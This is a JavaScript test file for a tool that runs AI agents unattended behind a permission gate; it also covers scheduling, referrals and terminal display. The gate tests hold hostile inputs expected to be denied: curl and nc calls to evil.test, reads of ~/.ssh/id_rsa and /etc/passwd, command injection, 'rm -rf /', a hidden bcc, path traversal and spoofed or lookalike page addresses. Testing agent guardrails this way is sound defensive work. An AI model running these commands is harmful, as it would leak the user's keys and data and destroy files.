  core.addDraft(s, { agent: "Standout", text: "Any update?", kind: "nudge", company: "Acme" });
  const before = s.queue.length;
  core.removeRole(s, role.id);
  assert.ok(!s.roles.includes(role));
  assert.equal(s.queue.length, before);
  assert.throws(() => core.removeRole(s, role.id), /no role/);
});

// ---------------------------------------------------------------- the gate on runs nobody is watching
const approvedState = () => {
  const s = state();
  core.addAgent(s, "Standout", { handle: "+14155550100" });
  const item = core.addDraft(s, { agent: "Standout", text: "Any update on Acme?", kind: "nudge" });
  core.approve(s, item.id);
  return { s, item };
};
const SEND = "mcp__messages__tool_send_message";

test("a run can send only what was approved, word for word, to that address", () => {
  const { s, item } = approvedState();
  const ok = gate({ tool_name: SEND, tool_input: { recipient: "+1 (415) 555-0100", message: item.text } }, s, { run: "a" });
  assert.equal(ok.decision, "allow");
  assert.equal(ok.cleared, item.id);
  const refused = (input) => gate({ tool_name: SEND, tool_input: input }, s, { run: "a" }).decision;
  assert.equal(refused({ recipient: "+14155550100", message: "Any update on Acme? Also my floor is 300k" }), "deny", "changed text");
  assert.equal(refused({ recipient: "+14155559999", message: item.text }), "deny", "another number");
  assert.equal(refused({ recipient: "Mom", message: item.text }), "deny", "a name that could be anyone");
  assert.equal(gate({ tool_name: "mcp__gmail__reply", tool_input: { thread: "t", body: item.text, bcc: "x@evil.test" } }, s, { run: "a" }).decision, "deny", "a hidden copy");
  assert.equal(refused({ recipient: "+14155550100", message: item.text, subject: "the floor is 300k" }), "deny", "words in another field");
  assert.equal(refused({ target: "+14155559999", message: item.text }), "deny", "another number under an unexpected name");
  assert.equal(gate({ tool_name: "mcp__gmail__reply", tool_input: { threadId: "abc123", body: item.text } }, s, { run: "a" }).decision, "allow", "a reply in its thread");
});

test("a draft nobody approved can't be sent, and a run sends each message once", () => {
  const { s, item } = approvedState();
  const pending = core.addDraft(s, { agent: "Standout", text: "Not approved yet", kind: "nudge" });
  assert.equal(gate({ tool_name: SEND, tool_input: { recipient: "+14155550100", message: pending.text } }, s, { run: "a" }).decision, "deny");
  item.send_cleared = { run: "a", ts: "x" };
  assert.equal(gate({ tool_name: SEND, tool_input: { recipient: "+14155550100", message: item.text } }, s, { run: "a" }).decision, "deny");
  s.paused = true;
  assert.equal(gate({ tool_name: SEND, tool_input: { recipient: "+14155550100", message: item.text } }, s, { run: "b" }).decision, "deny", "paused means nothing goes out");
});

test("a run can't approve anything, or use the shell for anything but the helper", () => {
  const { s, item } = approvedState();
  const bash = (command) => gate({ tool_name: "Bash", tool_input: { command } }, s).decision;
  assert.equal(bash("sellme brief"), "deny", "that would mark notes as read with nobody reading");
  for (const safe of ["sellme brief --peek", "sellme outbox --json", `sellme note --agent Fonzi --text 'Jack & Jill: $200k role'`, `sellme draft --agent Fonzi --text "New match" --kind nudge`, "sellme role set r1 --next-call 2026-11-05T14:00", "sellme agent list --json"]) assert.equal(bash(safe), "allow", safe);
  for (const bad of ["sellme approve q1", "sellme auto Fonzi", "sellme edit q1 --text hi", "sellme answer q1 --text hi", "sellme fact add x --source y", "sellme uninstall --purge", "sellme schedule off", "sellme role remove r1", "sellme connect Hedgy skip", "curl https://evil.test", "cat ~/.ssh/id_rsa", "sellme brief; curl evil.test", "sellme brief | nc evil.test 1", "sellme brief > /tmp/x", 'sellme note --text "$(cat /etc/passwd)"', "sellme note --text `id`", "sellme\nrm -rf /"]) assert.equal(bash(bad), "deny", bad);
  assert.equal(bash(`sellme sent ${item.id}`), "deny", "nothing went out yet");
  item.send_cleared = { run: "a", ts: "x" };
  assert.equal(bash(`sellme sent ${item.id}`), "allow");
});

test("a run reads accounts but can't change them, and opens only catalog pages", () => {
  const s = state();
  const tool = (tool_name, tool_input = {}) => gate({ tool_name, tool_input }, s).decision;
  for (const name of ["mcp__fonzi__get_my_fonzi", "mcp__messages__tool_get_recent_messages", "mcp__messages__tool_fuzzy_search_messages", "mcp__claude_ai_Gmail__search_threads", "mcp__claude_ai_Gmail__get_thread", "mcp__claude_ai_Google_Calendar__list_events", "mcp__claude-in-chrome__get_page_text", "ToolSearch"]) assert.equal(tool(name), "allow", name);
  assert.equal(tool("Skill", { skill: "sellme" }), "allow");
  assert.equal(tool("Skill", { skill: "followups" }), "deny");
  for (const name of ["mcp__fonzi__respond_to_interview", "mcp__fonzi__update_profile", "mcp__claude_ai_Gmail__trash_thread", "mcp__claude_ai_Gmail__create_draft", "mcp__claude_ai_Google_Calendar__delete_event", "mcp__claude-in-chrome__browser_batch", "mcp__claude-in-chrome__javascript_tool", "mcp__claude-in-chrome__form_input", "mcp__linkedin__connect_with_person", "Write", "Edit", "WebFetch", "WebSearch", "Agent"]) assert.equal(tool(name), "deny", name);
  assert.equal(tool("mcp__claude-in-chrome__navigate", { url: "https://app.jackandjill.ai/jobs" }), "allow");
  assert.equal(tool("mcp__claude-in-chrome__navigate", { url: "https://evil.test/?floor=300k" }), "deny");
  assert.equal(tool("Read", { file_path: `${process.env.HOME}/.sellme/state.json` }), "deny");
  assert.equal(tool("Read", { file_path: `${process.env.HOME}/.claude/skills/sellme/references/run.md` }), "allow");
  assert.equal(tool("Read", { file_path: `${process.env.HOME}/.claude/skills/sellme/../../../.ssh/id_rsa` }), "deny");
});

test("the hook answers in Claude Code's format, and refuses what it can't read", () => {
  const reply = JSON.parse(gateHook("not json"));
  assert.equal(reply.hookSpecificOutput.hookEventName, "PreToolUse");
  assert.equal(reply.hookSpecificOutput.permissionDecision, "deny");
});

test("the row leaves the list only once the send is confirmed", async () => {
  const { s, item } = approvedState();
  assert.ok(draftRows(s).some((r) => r.id === item.id && r.approved));
  core.markSent(s, item.id);
  assert.ok(!draftRows(s).some((r) => r.id === item.id));
  assert.match(s.notes.at(-1).text, /^Sent: /);
});

test("a run is told to prompt nothing and to pass every call through the gate", () => {
  const args = agentArgs("/sellme send");
  assert.deepEqual(args.slice(0, 2), ["-p", "/sellme send"]);
  assert.deepEqual(args.slice(4, 6), ["--permission-mode", "dontAsk"]);
  const persona = fs.readFileSync(args[args.indexOf("--append-system-prompt-file") + 1], "utf8");
  assert.match(persona, /No job, no tokens\. No tokens, no you\./);
  const settings = JSON.parse(fs.readFileSync(args[args.indexOf("--settings") + 1], "utf8"));
  assert.equal(settings.hooks.PreToolUse[0].matcher, "*");
  assert.match(settings.hooks.PreToolUse[0].hooks[0].command, /sellme\.js' agent-gate$/);
  assert.match(settings.hooks.PostToolUse[0].hooks[0].command, /agent-gate$/, "the gate learns what's on each page");
  assert.ok(!args.includes("--dangerously-skip-permissions"));
});

// ---------------------------------------------------------------- the schedule
const fakeRun = () => {
  const calls = [];
  const run = (bin, args, input) => {
    calls.push([bin, ...args, ...(input === undefined ? [] : [input])]);
    return { status: 0, stdout: bin === "crontab" && args[0] === "-l" ? "0 1 * * * /usr/bin/mine\n0 9 * * * old # Added by Sellme\n" : "" };
  };
  return { calls, run };
};
const withSandbox = async (fn) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "sellme-sched-"));
  const saved = { HOME: process.env.HOME, SELLME_HOME: process.env.SELLME_HOME, PATH: process.env.PATH };
  fs.mkdirSync(path.join(dir, "bin"));
  fs.writeFileSync(path.join(dir, "bin", "claude"), "#!/bin/sh\n", { mode: 0o755 });
  Object.assign(process.env, { HOME: dir, SELLME_HOME: path.join(dir, ".sellme"), PATH: path.join(dir, "bin") });
  try {
    await fn(dir);
  } finally {
    Object.assign(process.env, saved);
    if (saved.SELLME_HOME === undefined) delete process.env.SELLME_HOME;
  }
};

test("on a Mac a schedule is one launchd job, and off takes it back", () => withSandbox((dir) => {
  const { calls, run } = fakeRun();
  assert.equal(setSchedule("daily", { platform: "darwin", run }).id, "daily");
  const plist = fs.readFileSync(path.join(dir, "Library/LaunchAgents/sellme.run.plist"), "utf8");
  assert.match(plist, /<string>scheduled-run<\/string>/);
  assert.match(plist, /<key>Hour<\/key><integer>9<\/integer>/);
  assert.match(plist, new RegExp(`<key>PATH</key><string>${path.join(dir, "bin")}`), "launchd has no PATH of its own");
  assert.ok(calls.some((c) => c[0] === "launchctl" && c[1] === "bootstrap"));
  assert.equal(load().schedule.every, "daily");
  setSchedule("off", { platform: "darwin", run });
  assert.ok(!fs.existsSync(path.join(dir, "Library/LaunchAgents/sellme.run.plist")));
  assert.equal(load().schedule, null);
}));

test("on Linux a schedule is one marked cron line, and the user's own lines stay", () => withSandbox(() => {
  const { calls, run } = fakeRun();
  setSchedule("hourly", { platform: "linux", run });
  const written = calls.at(-1).at(-1);
  assert.match(written, /0 1 \* \* \* \/usr\/bin\/mine/);
  assert.equal(written.match(/Added by Sellme/g).length, 1);
  assert.match(written, /^0 \* \* \* \* .*scheduled-run # Added by Sellme$/m);
}));

test("on Windows a schedule is one Task Scheduler task, and off takes it back", () => withSandbox((dir) => {
  const { calls, run } = fakeRun();
  assert.equal(setSchedule("weekly", { platform: "win32", run }).id, "weekly");
  const made = calls.at(-1);
  assert.deepEqual(made.slice(0, 5), ["schtasks", "/Create", "/TN", "Sellme Check", "/F"]);
  assert.deepEqual(made.slice(5, 11), ["/SC", "WEEKLY", "/D", "MON", "/ST", "09:00"]);
  const script = path.join(dir, ".sellme", "scheduled-run.cmd");
  assert.equal(made.at(-1), `conhost.exe --headless cmd.exe /c "${script}"`);
  assert.ok(made.at(-1).length < 261, "Task Scheduler cuts longer commands");
  assert.match(fs.readFileSync(script, "utf8"), /set "PATH=.*\r\nset "SELLME_HOME=.*scheduled-run\r\n$/s);
  assert.equal(load().schedule.every, "weekly");
  setSchedule("off", { platform: "win32", run });
  assert.deepEqual(calls.at(-1), ["schtasks", "/Delete", "/TN", "Sellme Check", "/F"]);
  assert.ok(!fs.existsSync(script));
  assert.equal(load().schedule, null);
}));

test("every schedule can be set on Windows, and a refusal leaves nothing behind", () => withSandbox((dir) => {
  for (const s of SCHEDULES) assert.ok(s.windows.includes("/SC") && s.windows.includes("/ST"), s.id);
  const refuse = (bin, args) => ({ status: args[0] === "/Create" ? 1 : 0 });
  assert.throws(() => setSchedule("daily", { platform: "win32", run: refuse }), /Task Scheduler wouldn/);
  assert.ok(!fs.existsSync(path.join(dir, ".sellme", "scheduled-run.cmd")));
  assert.equal(load().schedule ?? null, null);
}));

test("the Windows script keeps percent signs in paths from being expanded", () => withSandbox(() => {
  const text = windowsScript({ node: "C:\\Program Files\\nodejs\\node.exe", entry: "C:\\a%b\\sellme.js", env: { PATH: "C:\\x;C:\\100%" } });
  assert.match(text, /set "PATH=C:\\x;C:\\100%%"/);
  assert.match(text, /"C:\\Program Files\\nodejs\\node\.exe" "C:\\a%%b\\sellme\.js" scheduled-run/);
}));

test("Windows finds tools by their extension, and a .cmd file goes through cmd.exe with quoted arguments", () => {
  const files = new Set(["C:\\bin\\claude.cmd", "C:\\codex\\codex.exe"]);
  const opts = { platform: "win32", sep: ";", join: path.win32.join, exists: (f) => files.has(f) };
  assert.equal(findOnPath("claude", "C:\\none;C:\\bin", opts), "C:\\bin\\claude.cmd");
  assert.equal(findOnPath("nope", "C:\\bin", opts), null);
  const find = (bin) => findOnPath(bin, "C:\\bin;C:\\codex", opts);
  assert.deepEqual(toolCommand("codex", ["exec"], { platform: "win32", find }), { file: "C:\\codex\\codex.exe", args: ["exec"] });
  const viaCmd = toolCommand("claude", ["-p", "/sellme run", "--tools", ""], { platform: "win32", find });
  assert.equal(viaCmd.file, "cmd.exe");
  assert.equal(viaCmd.verbatim, true);
  assert.equal(viaCmd.args.at(-1), `"\"C:\\bin\\claude.cmd\" \"-p\" \"/sellme run\" \"--tools\" \"\""`.replace(/\\"/g, '"'));
  assert.throws(() => toolCommand("claude", ["100%path%"], { platform: "win32", find }), /safely/);
  assert.deepEqual(toolCommand("claude", ["-p"], { platform: "darwin" }), { file: "claude", args: ["-p"] }, "elsewhere nothing changes");
});

test("on Windows the skill calls the helper with forward slashes, which the gate accepts", () => {
  assert.equal(helperCommand("C:\\Users\\Maya\\.sellme\\bin\\sellme", "win32"), "C:/Users/Maya/.sellme/bin/sellme");
  assert.equal(helperCommand("C:\\Users\\Maya Lee\\.sellme\\bin\\sellme", "win32"), '"C:/Users/Maya Lee/.sellme/bin/sellme"');
  assert.deepEqual(shellWords('"C:/Users/Maya Lee/.sellme/bin/sellme" brief'), ["C:/Users/Maya Lee/.sellme/bin/sellme", "brief"]);
  assert.match(shimCmd("C:\\node.exe", "C:\\sellme.js", "C:\\h"), /set "SELLME_HOME=C:\\h"\r\n.*"C:\\sellme\.js" %\*/s);
});

test("a schedule refuses what it can't do, and changes nothing", () => withSandbox(() => {
  const { calls, run } = fakeRun();
  assert.throws(() => setSchedule("sometimes", { platform: "darwin", run }), /Use one of/);
  assert.throws(() => setSchedule("daily", { platform: "sunos", run }), /Mac, Windows or Linux/);
  assert.throws(() => setSchedule("daily", { platform: "darwin", run, envPath: "/nowhere" }), /need Claude Code/);
  assert.equal(calls.length, 0);
}));

test("a check reads the people the user writes to first, then the agent sites and apps", () => withSandbox(async () => {
  withState((s) => {
    core.addAgent(s, "Jack & Jill", { channel: "browser" });
    core.addAgent(s, "Dex", { channel: "mcp" });
  });
  const order = [];
  const runner = async (prompt) => {
    const lane = prompt.match(/ran --lane (\w+)/)[1];
    order.push(`start ${lane}`);
    await new Promise((r) => setTimeout(r, 5));
    withState((s) => { (s.lane_runs ??= {})[lane] = new Date().toISOString(); });
    order.push(`end ${lane}`);
    return { ok: true, output: "done" };
  };
  assert.equal((await scheduledRun({ runner, platform: "linux" })).ok, true);
  const lastPerson = Math.max(order.indexOf("end email"), order.indexOf("end linkedin"));
  assert.ok(order.indexOf("start websites") > lastPerson && order.indexOf("start apps") > lastPerson, order.join(", "));
}));

test("a check does nothing while paused, and two can't overlap", () => withSandbox(async () => {
  withState((s) => { s.paused = true; });
  let ran = 0;
  // Each lane says it got to the end, the way a real lane runs `sellme ran --lane <id>`.
  const runner = async (prompt) => {
    ran += 1;
    const lane = prompt.match(/ran --lane (\w+)/)[1];
    withState((s) => { (s.lane_runs ??= {})[lane] = new Date().toISOString(); });
    return { ok: true, output: "done" };
  };
  assert.equal((await scheduledRun({ runner, platform: "linux" })).skipped, "paused");
  assert.equal(ran, 0);
  withState((s) => { s.paused = false; });
  assert.equal((await scheduledRun({ runner, platform: "linux" })).ok, true);
  assert.equal(ran, 2, "email and LinkedIn, at the same time");
  assert.equal(load().schedule_last.ok, true);
  assert.ok(load().last_run, "the check records the time once every lane is done");
  const inner = [];
  await scheduledRun({ platform: "linux", runner: async () => { inner.push(await scheduledRun({ runner })); return { ok: true, output: "" }; } });
  assert.equal(inner[0].skipped, "already running");
  const stoppedEarly = await scheduledRun({ platform: "linux", runner: async () => ({ ok: true, output: "I couldn't read my instructions." }) });
  assert.equal(stoppedEarly.ok, false, "a clean exit that never got to the end isn't a finished check");
  assert.match(stoppedEarly.why, /stopped before it finished/);
}));

test("a check runs one lane per channel at once, each with only its own contacts, and a new agent goes first", async () => {
  const { checkLanes } = await import("../lib/schedule.js");
  const s = freshState();
  core.addAgent(s, "Fonzi");
  core.addAgent(s, "Jack & Jill");
  core.addAgent(s, "Standout", { channel: "imessage", handle: "+15550002222" });
  core.addRecruiter(s, "Lee Park", { handle: "lee@talent.example" });
  core.addRecruiter(s, "Dana Ford", { handle: "linkedin.com/in/ben-ford-test" });
  const opening = checkLanes(s, { start: "Jack & Jill", platform: "darwin" });
  assert.deepEqual(opening.map((l) => l.id), ["websites"], "a just-connected agent is one conversation, not a whole check");
  assert.match(opening[0].prompt, /Your contacts: Jack & Jill\./);
  assert.match(opening[0].prompt, /Jack & Jill was just connected: open that conversation/);
  assert.match(opening[0].prompt, /don't run `sellme ran`/);
  const lanes = checkLanes(s, { platform: "darwin" });
  assert.deepEqual(lanes.map((l) => l.id), ["websites", "email", "texts", "linkedin", "apps"]);
  const lane = Object.fromEntries(lanes.map((l) => [l.id, l]));
  assert.match(lane.websites.prompt, /Your contacts: Jack & Jill\./);
  assert.equal(lane.websites.chrome, true);
  assert.equal(lane.email.chrome, false, "only the website lane takes Chrome");
  assert.match(lane.email.prompt, /Your contacts: Lee Park\./);
  assert.match(lane.texts.prompt, /Your contacts: Standout\./);
  assert.match(lane.linkedin.prompt, /Your contacts: Dana Ford\./);
  assert.match(lane.apps.prompt, /Your contacts: Fonzi\./);
  assert.ok(lanes.every((l) => l.prompt.startsWith("/sellme run unattended") && l.prompt.includes(`sellme ran --lane ${l.id}`)));
  assert.deepEqual(checkLanes(freshState(), { platform: "linux" }).map((l) => l.id), ["email", "linkedin"], "with no agents, it still looks for people who wrote");
});

test("a check that can't read Messages leaves the texts lane out and says why, instead of failing every hour", async () => {
  const { checkLanes, scheduledRun } = await import("../lib/schedule.js");
  const s = freshState();
  core.addAgent(s, "Standout", { channel: "imessage", handle: "+15550002222" });
  assert.ok(!checkLanes(s, { platform: "darwin", texts: false }).some((l) => l.id === "texts"));
  assert.ok(checkLanes(s, { platform: "darwin" }).some((l) => l.id === "texts"));
  await withSandbox(async () => {
    withState((st) => Object.assign(st, { agents: s.agents, setup_done: true }));
    const ran = [];
    const runner = async (prompt) => {
      const lane = prompt.match(/--lane (\w+)/)[1];
      ran.push(lane);
      withState((st) => { (st.lane_runs ??= {})[lane] = new Date().toISOString(); });
      return { ok: true, output: "done" };
    };
    const last = await scheduledRun({ runner, platform: "darwin", texts: false });
    assert.ok(!ran.includes("texts"));
    assert.equal(last.ok, true, "the lanes it could run all finished");
    assert.match(fs.readFileSync(path.join(process.env.SELLME_HOME, "schedule.log"), "utf8"), /\[texts\] Skipped: this check can't read Messages/);
  });
});

test("a run stopped by the time limit says so, instead of blaming a sign-in", async () => {
  const { runAgent } = await import("../lib/agent.js");
  const { EventEmitter } = await import("node:events");
  const fake = (code, after) => () => {
    const child = new EventEmitter();
    child.stdout = new EventEmitter();
    child.stderr = new EventEmitter();
    setTimeout(() => child.emit("close", code, null), after);
    return child;
  };
  await withSandbox(async () => {
    const slow = await runAgent("x", { spawnFn: fake(143, 1100), timeout: 1000, chrome: false });
    assert.match(slow.failed, /took over/);
    const quick = await runAgent("x", { spawnFn: fake(1, 10), timeout: 60_000, chrome: false });
    assert.match(quick.failed, /sign in/);
  });
});

test("a newly connected agent is marked to get its first message, and the mark goes once it has one", () => {
  const s = freshState();
  s.autopilot = false;
  core.addAgent(s, "Fonzi");
  assert.equal(s.agents[0].intro, true);
  assert.equal(core.pushList(s).contacts[0].just_connected, true);
  core.addDraft(s, { agent: "Fonzi", text: "Hi Fonzi, this is the AI agent for Maya. Any matches?", kind: "nudge" });
  assert.equal(s.agents[0].intro, undefined);
  core.addAgent(s, "Clera", { channel: "imessage", handle: "+15550003333", byRun: true });
  assert.equal(s.agents.find((a) => a.name === "Clera").intro, undefined, "one a check found is already talking");
  core.setConnection(s, "Clera", "access");
  core.setConnection(s, "Clera", "ok");
  assert.equal(s.agents.find((a) => a.name === "Clera").intro, true, "reachable at last, and never written to");
});

// ---------------------------------------------------------------- referrals
test("every agent in the catalog has a referral slot, on by default", () => {
  assert.deepEqual(PROGRAMS.map((p) => p.name), Object.values(core.CATALOG).map((e) => e.name));
  assert.ok(PROGRAMS.every((p) => p.referral_link));
  assert.deepEqual(PROGRAMS.filter(liveLink).map((p) => p.name), ["Fonzi", "Jack & Jill"]);
});

test("a placeholder never reaches anyone: it signs up on the plain page and claims no referral", () => {
  const list = signupList([]);
  const clera = list.find((p) => p.name === "Clera");
  assert.deepEqual([clera.url, clera.uses_referral_link], ["https://www.getclera.com/chat", false]);
  const fonzi = list.find((p) => p.name === "Fonzi");
  assert.deepEqual([fonzi.url, fonzi.uses_referral_link], ["https://talent.fonzi.ai/referral/vxqkg9p9", true]);
  assert.ok(list.every((p) => p.url.startsWith("https://") && !p.url.includes(PLACEHOLDER)));
  const filled = signupList([], { programs: [{ name: "Clera", referral_link: "https://www.getclera.com/?ref=me", page: "https://www.getclera.com" }] });
  assert.deepEqual([filled[0].url, filled[0].uses_referral_link], ["https://www.getclera.com/?ref=me", true], "filling it in is all it takes");
});

// ---------------------------------------------------------------- the sync on opening
test("opening syncs when it can, and not right after the last one", () => {
  const ready = () => {
    const s = state();
    core.addFact(s, "Led a team of 6", "resume");
    s.profile = { name: "Maya", roles: ["fde"], floor: "1", where: "NYC", never_mention: [] };
    return s;
  };
  const today = new Date("2026-11-03T12:00:00Z");
  assert.equal(shouldSync(ready(), { today, can: true }), true);
  assert.equal(shouldSync(ready(), { today, can: false }), false, "no Claude Code");
  assert.equal(shouldSync({ ...ready(), paused: true }, { today, can: true }), false, "paused");
  assert.equal(shouldSync(freshState(), { today, can: true }), false, "setup isn't done");
  assert.equal(shouldSync({ ...ready(), last_run: "2026-11-03T11:55:00Z" }, { today, can: true }), false, "five minutes ago");
  assert.equal(shouldSync({ ...ready(), last_run: "2026-11-03T11:45:00Z" }, { today, can: true }), true);
});

test("the summary says what the sync found", () => {
  const today = new Date("2026-11-03T12:00:00Z");
  const before = state();
  core.addAgent(before, "Standout", { handle: "+14155550100" });
  core.addRole(before, { company: "Acme", stage: "talking" });
  core.addRole(before, { company: "Basis", stage: "talking" });
  const waiting = core.addDraft(before, { agent: "Standout", text: "Any update?", kind: "nudge" });
  core.approve(before, waiting.id);
  const after = structuredClone(before);
  assert.equal(syncSummary(before, after, today), "Nothing new");
  core.setNextCall(after, after.roles[0].id, "2026-11-05T14:00:00Z");
  core.setRole(after, after.roles[1].id, "rejected");
  core.addRole(after, { company: "New Co" });
  core.addDraft(after, { agent: "Standout", text: "Is that still open?", kind: "nudge" });
  core.markSent(after, waiting.id);
  assert.equal(syncSummary(before, after, today), "1 new request for you · 1 call scheduled · 1 rejection · 1 new match · 1 sent");
});

test("the loading screen names what it read, and none of what it says", () => {
  assert.equal(activityLabel("mcp__messages__tool_get_recent_messages", {}), "Reading iMessage");
  assert.equal(activityLabel("mcp__fonzi__get_my_fonzi", {}), "Reading Fonzi");
  assert.equal(activityLabel("mcp__claude_ai_Gmail__search_threads", { query: "secret" }), "Reading email");
  assert.equal(activityLabel("mcp__claude-in-chrome__navigate", { url: "https://app.jackandjill.ai/jobs" }), "Reading Jack & Jill");
  assert.equal(activityLabel("Bash", { command: "sellme role set r1 --next-call 2026-11-05" }), "Updating your pipeline and calls");
  assert.equal(activityLabel("Skill", {}), null);
  const screen = syncScreen(0, 83, ["Reading iMessage", "Reading Fonzi"], c);
  assert.match(screen, /Selling you to my agentic friends\s+1:23/);
  assert.match(screen, /✓ Reading iMessage/);
  assert.match(screen, /Reading Fonzi…/);
  assert.match(screen, /esc to skip/);
});

test("a role and the footer each stay on one line in a narrow terminal", () => {
  const row = { text: "A Very Long Company Name Incorporated, Founding Forward Deployed Engineer", detail: "Jack & Jill", call: "2030-01-07T15:00:00Z" };
  for (const width of [60, 80, 100, 140]) {
    const line = pipelineLine(row, "❯", c, width);
    assert.ok(line.length <= width, `${width}: ${line}`);
    assert.match(line, /Next call/, "the call time is what matters most");
    for (const tab of ["Inbox", "Agents", "Pipeline", "Schedule"]) assert.ok(footerLine(tab, width).length < width, `${tab} at ${width}`);
  }
  assert.match(footerLine("Pipeline", 80), /n nudge · f follow up/);
  assert.match(footerLine("Pipeline", 140), /←→ tabs/);
});

test("a schedule warns that a Mac won't let it read iMessage, only when that matters", () => {
  const s = state();
  assert.equal(scheduleWarning(s, { platform: "darwin" }), null, "nobody texts");
  core.addAgent(s, "Standout", { handle: "+14155550100" });
  assert.match(scheduleWarning(s, { platform: "darwin", node: "/usr/bin/node" }), /can’t read Standout.*Full Disk Access.*\/usr\/bin\/node/);
  assert.equal(scheduleWarning(s, { platform: "linux" }), null);
  assert.match(scheduleWarning(s, { platform: "win32" }), /plugged in/);
});

// ---------------------------------------------------------------- typing into a browser chat
const CHROME = (t) => `mcp__claude-in-chrome__${t}`;
const JACK_PAGE = `button "Attach file" [ref_13] type="button"\ntextbox "Ask Jack anything..." [ref_14] placeholder="Ask Jack anything..."\nbutton "Voice input" [ref_15]\nbutton "Call Jack" [ref_16] type="button"\ntextbox "Search jobs" [ref_17]\ntextbox "Your headline" [ref_18]\nbutton "Request an intro" [ref_19]`;
const tabLine = (tab, title, url) => `Tab Context:\n- Available tabs:\n  • tabId ${tab}: "${title}" ("${url}")`;
const browserState = () => {
  const s = freshState();
  s.profile = { name: "Maya", roles: ["Staff Engineer"], floor: "$180K", where: "NYC or remote", never_mention: [] };
  core.addAgent(s, "Jack & Jill", { channel: "browser" });
  core.addAgent(s, "Fonzi", { channel: "mcp" });
  const item = core.addDraft(s, { agent: "Jack & Jill", asked: "NYC?", text: "Yes. NYC or remote.", sources: ["profile.where"] });
  core.approve(s, item.id);
  const browser = learnFromTool({ tool_name: CHROME("read_page"), tool_input: { tabId: 7 }, tool_response: [{ type: "text", text: JACK_PAGE }, { type: "text", text: tabLine(7, "Jack", "https://app.jackandjill.ai/jack/dashboard/inbox") }] }, { run: "r", tabs: {}, refs: {}, typed: {} });
  const act = (input, b = browser) => gate({ tool_name: CHROME("computer"), tool_input: { tabId: 7, ...input } }, s, { run: "r", browser: b });
  return { s, item, browser, act };
};

test("the gate only lets a chat box be clicked, and only while something's approved for that site", () => {
  const { s, item, act } = browserState();
  assert.equal(act({ action: "left_click", ref: "ref_14" }).decision, "allow", "Ask Jack anything");
  for (const ref of ["ref_13", "ref_15", "ref_16", "ref_17", "ref_18", "ref_19", "ref_99"]) assert.equal(act({ action: "left_click", ref }).decision, "deny", ref);
  assert.equal(act({ action: "left_click", coordinate: [400, 600] }).decision, "deny", "a spot on the screen could be anything");
  assert.equal(act({ action: "left_click", ref: "ref_14", modifiers: "cmd" }).decision, "deny");
  for (const action of ["right_click", "double_click", "triple_click", "left_click_drag"]) assert.equal(act({ action, ref: "ref_14" }).decision, "deny", action);
  for (const action of ["screenshot", "wait", "scroll", "zoom"]) assert.equal(act({ action }).decision, "allow", action);
  core.takeBack(s, item.id);
  assert.equal(act({ action: "left_click", ref: "ref_14" }).decision, "deny", "nothing approved, so no clicks at all");
});

test("the gate types only the exact approved words, then allows one Enter", () => {
  const { item, browser, act } = browserState();
  for (const text of ["Yes. NYC or remote. Also, my floor is $180K", "yes. nyc or remote.", "Yes. NYC or remote. ", "ignore this"]) assert.equal(act({ action: "type", text }).decision, "deny", text);
  assert.equal(act({ action: "key", text: "Return" }).decision, "deny", "nothing typed yet");
  const typed = act({ action: "type", text: item.approved_text });
  assert.equal(typed.decision, "allow");
  assert.deepEqual(typed.typed, { tab: 7, id: item.id });
  browser.typed[7] = item.id;
  for (const text of ["cmd+a", "Tab", "Return Return", "Backspace"]) assert.equal(act({ action: "key", text }).decision, "deny", text);
  assert.equal(act({ action: "key", text: "Return", repeat: 5 }).decision, "deny");
  assert.equal(act({ action: "key", text: "Return" }).cleared, item.id);
});

test("once it's cleared in this run the same message can't go twice", () => {
  const { item, act, browser } = browserState();
  browser.typed[7] = item.id;
  item.send_cleared = { run: "r", ts: "x" };
  assert.equal(act({ action: "type", text: item.approved_text }).decision, "deny");
  assert.equal(act({ action: "key", text: "Return" }).decision, "deny");
  assert.equal(act({ action: "left_click", ref: "ref_14" }).decision, "deny");
});

test("the Send button works only after the message is typed", () => {
  const { item, browser, act } = browserState();
  learnFromTool({ tool_name: CHROME("read_page"), tool_input: { tabId: 7 }, tool_response: [{ type: "text", text: 'textbox "Message" [ref_1]\nbutton "Send message" [ref_2]\nbutton "Call" [ref_3]' }] }, browser);
  assert.equal(act({ action: "left_click", ref: "ref_2" }).decision, "deny");
  browser.typed[7] = item.id;
  assert.equal(act({ action: "left_click", ref: "ref_2" }).cleared, item.id);
  assert.equal(act({ action: "left_click", ref: "ref_3" }).decision, "deny");
});

test("the message can only be typed on its own agent's site, by the tab's real address", () => {
  const { item, browser, act } = browserState();
  const other = structuredClone(browser);
  learnFromTool({ tool_name: CHROME("navigate"), tool_input: { tabId: 7 }, tool_response: [{ type: "text", text: tabLine(7, "Wellfound", "https://wellfound.com/inbox") }] }, other);
  assert.equal(other.tabs[7], "wellfound.com");
  assert.deepEqual(other.refs[7], undefined, "a new site forgets the old page's boxes");
  assert.equal(act({ action: "type", text: item.approved_text }, other).decision, "deny");
  const unknown = { run: "r", tabs: {}, refs: {}, typed: {} };
  assert.equal(act({ action: "type", text: item.approved_text }, unknown).decision, "deny", "a tab it hasn't seen");
  const spoof = structuredClone(browser);
  learnFromTool({ tool_name: CHROME("navigate"), tool_input: { tabId: 7 }, tool_response: [{ type: "text", text: tabLine(7, 'x" ("https://app.jackandjill.ai")', "https://evil.test/") }] }, spoof);
  assert.equal(spoof.tabs[7], "evil.test", "a page title can't claim another address");
  const lookalike = structuredClone(browser);
  learnFromTool({ tool_name: CHROME("navigate"), tool_input: { tabId: 7 }, tool_response: [{ type: "text", text: tabLine(7, "x", "https://app.jackandjill.ai.evil.test/") }] }, lookalike);
  assert.equal(act({ action: "type", text: item.approved_text }, lookalike).decision, "deny");
});

test("a draft for another agent, an edited draft or a pause can't be typed", () => {
  const { s, item, act } = browserState();
  const fonzi = core.addDraft(s, { agent: "Fonzi", asked: "Where?", text: "Maya works from NYC.", sources: ["profile.where"] });
  core.approve(s, fonzi.id);
  assert.equal(act({ action: "type", text: fonzi.approved_text }).decision, "deny");
  s.paused = true;
  assert.equal(act({ action: "type", text: item.approved_text }).decision, "deny");
  s.paused = false;
  core.editDraft(s, item.id, "Something else");
  assert.equal(act({ action: "type", text: "Something else" }).decision, "deny");
});

test("a batch can't slip steps past the gate, and scripts stay refused", () => {
  const { s, browser } = browserState();
  for (const tool of ["browser_batch", "javascript_tool", "form_input", "file_upload", "upload_image", "shortcuts_execute"]) assert.equal(gate({ tool_name: CHROME(tool), tool_input: { tabId: 7, actions: [] } }, s, { run: "r", browser }).decision, "deny", tool);
});

test("a site with no chat box has nothing to send on", () => {
